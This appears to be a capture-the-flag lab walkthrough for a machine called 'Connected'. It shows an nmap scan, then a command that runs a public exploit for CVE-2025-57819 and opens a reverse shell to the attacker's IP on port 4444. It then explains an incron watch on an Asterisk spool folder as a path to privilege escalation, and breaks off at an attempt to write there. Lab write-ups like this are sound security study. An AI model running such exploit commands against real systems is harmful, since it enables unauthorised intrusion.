# Connected


----

## Nmap `Scan`


```
nmap -sCV -Pn 10.129.16.73
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-07 19:36 EDT
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 90.61% done; ETC: 19:36 (0:00:00 remaining)
Nmap scan report for 10.129.16.73
Host is up (0.097s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-title: 404 Not Found
|_Requested resource was config.php
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.49 seconds

```


<img width="1919" height="859" alt="image" src="https://github.com/user-attachments/assets/ef6c2a17-ba39-49c7-b708-f3473cfab69e" />


## search for exploit for it found 

## [CVE-2025-57819](https://github.com/b4sh2/CVE-2025-57819-poc)

```
python3 exploit.py http://connected.htb --ip 10.10.17.161 -p 4444
```


<img width="1251" height="588" alt="image" src="https://github.com/user-attachments/assets/7647099e-3d69-486b-b89d-87eceb0d5469" />


## privesc



```
cat /etc/incron.d/sysadmin
```


<img width="981" height="119" alt="image" src="https://github.com/user-attachments/assets/b5893be4-f725-43b8-9645-66d917caa894" />



 First: What is incron?
========================

`incron` = short for **inotify cron**

It's like cron, but different:

- cron = runs commands at certain times (every minute/hour...)
- incron = Runs commands **when a file changes**


---




1️⃣ Watch path
-------------------------

```
/var/spool/asterisk/incron
```

Meaning:\
 Any file inside this folder

* * * * *

2️⃣ Events
--------------------

```
IN_MODIFY → When the file is modified IN_ATTRIB → When attributes are changed IN_CLOSE_WRITE → When it is closed after writing
```

* * * * *

3️⃣ When this happens → it works:
-------------------------

```
/usr/bin/sysadmin_manager $#
```

* * * * *

 practically means:
---------------

Anyone who writes or edits a file in:

```
/var/spool/asterisk/incron
```

 The system will operate automatically:

```
sysadmin_manager
```

---


## when i try to write in it 

<img width="1167" height="297" alt="image" src="https://github.com/user-attachments/assets/a16ef41c-da25-4959-8c9e-e443830a9b57" />





















